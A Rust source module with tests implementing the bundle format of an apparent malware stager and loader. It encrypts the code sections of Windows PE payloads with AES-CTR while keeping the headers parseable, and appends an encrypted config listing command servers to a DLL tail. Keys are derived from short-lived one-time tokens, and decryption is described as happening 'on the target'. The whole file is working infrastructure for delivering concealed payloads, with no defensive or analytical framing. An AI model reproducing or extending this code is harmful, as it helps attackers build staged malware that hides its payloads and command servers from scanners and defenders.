// Layered (staged) payload format shared by the Rust stager and loader.
//
// Wire layout, mirroring shared/protocol/staged.go byte for byte:
//
//	bundle  = u32le(loaderLen) | loader' | u32le(coreArtLen) | coreArt
//	coreArt = core' | cfgCT | u32le(cfgLen)
//
// `loader'` and `core'` are PE files whose section raw data was XORed with an
// AES-256-CTR keystream (headers stay clear so the file remains parseable);
// `cfgCT` is the encrypted payload config JSON appended at the DLL tail.
// All keys are SHA-256("sp-<domain>|<stage token>") with the first 16 key
// bytes as the CTR initial counter block (big-endian, byte-compatible with Go
// crypto/cipher.NewCTR).
use aes::cipher::{KeyIvInit, StreamCipher};
use sha2::{Digest, Sha256};

pub const LOADER_DOMAIN: &str = "loader";
pub const CORE_DOMAIN: &str = "core";
pub const CFG_DOMAIN: &str = "cfg";
pub const STAGE_DOMAIN: &str = "stage";

type Aes256Ctr = ctr::Ctr128BE<aes::Aes256>;

// derive_key returns SHA-256("sp-<domain>|<token>"), the single secret all
// staged artifacts are keyed by. The token is one-time and short-TTL, so the
// material never exists outside the delivery window.
pub fn derive_key(domain: &str, token: &str) -> [u8; 32] {
    let mut h = Sha256::new();
    h.update(format!("sp-{domain}|{token}").as_bytes());
    h.finalize().into()
}

pub fn loader_key(token: &str) -> [u8; 32] {
    derive_key(LOADER_DOMAIN, token)
}

pub fn core_key(token: &str) -> [u8; 32] {
    derive_key(CORE_DOMAIN, token)
}

pub fn cfg_key(token: &str) -> [u8; 32] {
    derive_key(CFG_DOMAIN, token)
}

pub fn stage_key(token: &str) -> [u8; 32] {
    derive_key(STAGE_DOMAIN, token)
}

fn ctr_of(key: &[u8; 32]) -> Aes256Ctr {
    let iv = key[..16].to_vec();
    Aes256Ctr::new(key.into(), iv.as_slice().into())
}

// section_ranges lists (offset, len) raw-data ranges of a PE file in section
// header order. Ranges can repeat across calls; the caller must use one
// keystream per image so encryption and decryption see identical order.
pub fn section_ranges(img: &[u8]) -> Result<Vec<(usize, usize)>, String> {
    if img.len() < 0x40 {
        return Err("not a PE: truncated dos header".into());
    }
    let e_lfanew = u32::from_le_bytes(img[0x3c..0x40].try_into().unwrap()) as usize;
    if e_lfanew + 24 > img.len() || &img[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return Err("not a PE: bad signature".into());
    }
    let nsec = u16::from_le_bytes(img[e_lfanew + 6..e_lfanew + 8].try_into().unwrap()) as usize;
    let sizeopt =
        u16::from_le_bytes(img[e_lfanew + 20..e_lfanew + 22].try_into().unwrap()) as usize;
    let secs = e_lfanew + 24 + sizeopt;
    if secs + nsec * 40 > img.len() {
        return Err("not a PE: section table out of bounds".into());
    }
    let mut out = Vec::with_capacity(nsec);
    for i in 0..nsec {
        let s = secs + i * 40;
        let raw_len = u32::from_le_bytes(img[s + 16..s + 20].try_into().unwrap()) as usize;
        let raw_off = u32::from_le_bytes(img[s + 20..s + 24].try_into().unwrap()) as usize;
        if raw_len == 0 {
            continue;
        }
        if raw_off.checked_add(raw_len).map(|end| end <= img.len()) != Some(true) {
            return Err("not a PE: section raw data out of bounds".into());
        }
        out.push((raw_off, raw_len));
    }
    Ok(out)
}

// crypt_sections runs one AES-256-CTR stream over the section raw data in
// place. XOR is symmetric, so encryption (server side) and decryption (on the
// target) are the same call.
pub fn crypt_sections(img: &mut [u8], key: &[u8; 32]) -> Result<(), String> {
    let ranges = {
        let ro: &[u8] = img;
        section_ranges(ro)?
    };
    let mut c = ctr_of(key);
    for (off, len) in ranges {
        c.apply_keystream(&mut img[off..off + len]);
    }
    Ok(())
}

// crypt_cfg is crypt_sections for the config blob.
pub fn crypt_cfg(data: &mut [u8], key: &[u8; 32]) {
    ctr_of(key).apply_keystream(data);
}

pub struct Bundle<'a> {
    pub loader: &'a [u8],
    pub core_art: &'a [u8],
}

fn take_u32(b: &[u8], at: usize) -> Result<usize, String> {
    if at + 4 > b.len() {
        return Err("staged: truncated length prefix".into());
    }
    Ok(u32::from_le_bytes(b[at..at + 4].try_into().unwrap()) as usize)
}

pub fn split_bundle(b: &[u8]) -> Result<Bundle<'_>, String> {
    let loader_len = take_u32(b, 0)?;
    let loader = b.get(4..4 + loader_len).ok_or("staged: loader length out of bounds")?;
    let core_len = take_u32(b, 4 + loader_len)?;
    let core_art = b
        .get(4 + loader_len + 4..4 + loader_len + 4 + core_len)
        .ok_or("staged: core length out of bounds")?;
    Ok(Bundle { loader, core_art })
}

// split_core_art returns (core image length, encrypted config tail). The cfg
// length rides as a trailer so the split is exact without parsing the core PE.
pub fn split_core_art(a: &[u8]) -> Result<(usize, &[u8]), String> {
    if a.len() < 4 {
        return Err("staged: core artifact too short".into());
    }
    let cfg_len = take_u32(a, a.len() - 4)?;
    if cfg_len == 0 || cfg_len > a.len() - 4 {
        return Err("staged: bad config tail length".into());
    }
    Ok((a.len() - 4 - cfg_len, &a[a.len() - 4 - cfg_len..a.len() - 4]))
}

#[cfg(test)]
mod tests {
    use super::*;

    // Cross-language contract: shared/protocol/staged_test.go uses the same
    // token and synthetic PE; the golden blobs must match byte for byte.
    const TOKEN: &str = "0123456789abcdef0123456789abcdef";

    fn synthetic_pe() -> Vec<u8> {
        let mut img = vec![0u8; 0x400];
        for (i, b) in img.iter_mut().enumerate() {
            *b = ((i * 7 + 3) & 0xff) as u8;
        }
        let secs = 0x40 + 24 + 0xF0;
        let s2 = secs + 40;
        img[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
        img[0x40..0x44].copy_from_slice(b"PE\0\0");
        img[0x46..0x48].copy_from_slice(&2u16.to_le_bytes()); // NumberOfSections
        img[0x54..0x56].copy_from_slice(&0xF0u16.to_le_bytes()); // SizeOfOptionalHeader
        img[secs + 16..secs + 20].copy_from_slice(&0x100u32.to_le_bytes());
        img[secs + 20..secs + 24].copy_from_slice(&0x200u32.to_le_bytes());
        img[s2 + 16..s2 + 20].copy_from_slice(&0x80u32.to_le_bytes());
        img[s2 + 20..s2 + 24].copy_from_slice(&0x300u32.to_le_bytes());
        img
    }

    #[test]
    fn section_ranges_report_raw_ranges() {
        let img = synthetic_pe();
        assert_eq!(section_ranges(&img).unwrap(), vec![(0x200, 0x100), (0x300, 0x80)]);
    }

    #[test]
    fn crypt_is_symmetric_and_spares_headers() {
        let img = synthetic_pe();
        let mut enc = img.clone();
        let key = core_key(TOKEN);
        crypt_sections(&mut enc, &key).unwrap();
        assert_eq!(&enc[..0x200], &img[..0x200], "headers must stay clear");
        assert_ne!(&enc[0x200..0x300], &img[0x200..0x300]);
        let mut dec = enc.clone();
        crypt_sections(&mut dec, &key).unwrap();
        assert_eq!(dec, img);
    }

    #[test]
    fn bundle_and_tail_roundtrip() {
        let loader = {
            let mut l = synthetic_pe();
            crypt_sections(&mut l, &loader_key(TOKEN)).unwrap();
            l
        };
        let core = {
            let mut c = synthetic_pe();
            crypt_sections(&mut c, &core_key(TOKEN)).unwrap();
            c
        };
        let cfg = b"{\"servers\":[\"http://x\"]}".to_vec();
        let mut bundle = Vec::new();
        bundle.extend_from_slice(&(loader.len() as u32).to_le_bytes());
        bundle.extend_from_slice(&loader);
        let core_art_len = core.len() + cfg.len() + 4;
        bundle.extend_from_slice(&(core_art_len as u32).to_le_bytes());
        bundle.extend_from_slice(&core);
        bundle.extend_from_slice(&cfg);
        bundle.extend_from_slice(&(cfg.len() as u32).to_le_bytes());

        let b = split_bundle(&bundle).unwrap();
        assert_eq!(b.core_art.len(), core_art_len);
        let (core_len, cfg_tail) = split_core_art(b.core_art).unwrap();
        assert_eq!(core_len, core.len());
        assert_eq!(cfg_tail, &cfg[..]);

        let mut core_dec = b.core_art[..core_len].to_vec();
        crypt_sections(&mut core_dec, &core_key(TOKEN)).unwrap();
        assert_eq!(core_dec, synthetic_pe());
    }

    #[test]
    fn keys_are_domain_separated() {
        assert_ne!(loader_key(TOKEN), core_key(TOKEN));
        assert_ne!(core_key(TOKEN), cfg_key(TOKEN));
        assert_eq!(stage_key(TOKEN).len(), 32);
    }

    #[test]
    fn golden_vectors_match_go() {
        // shared/protocol/staged_test.go asserts the same shas with the same
        // token on the same synthetic PE: any keystream drift between the Go
        // server and this crate fails on one side or the other.
        use sha2::{Digest, Sha256};
        let mut enc = synthetic_pe();
        crypt_sections(&mut enc, &core_key(TOKEN)).unwrap();
        assert_eq!(
            format!("{:x}", Sha256::digest(&enc)),
            "96fb0e24ce927f93160ff3261161d34236f7a35aa6d5487bc3e7a46a6b851575"
        );
        let mut cfg = b"{\"servers\":[\"http://x\"]}".to_vec();
        crypt_cfg(&mut cfg, &cfg_key(TOKEN));
        assert_eq!(
            format!("{:x}", Sha256::digest(&cfg)),
            "8d70e138d7be02322ed6365a8696be3077b287aee3e6e2a704cc49f879e30049"
        );
    }
}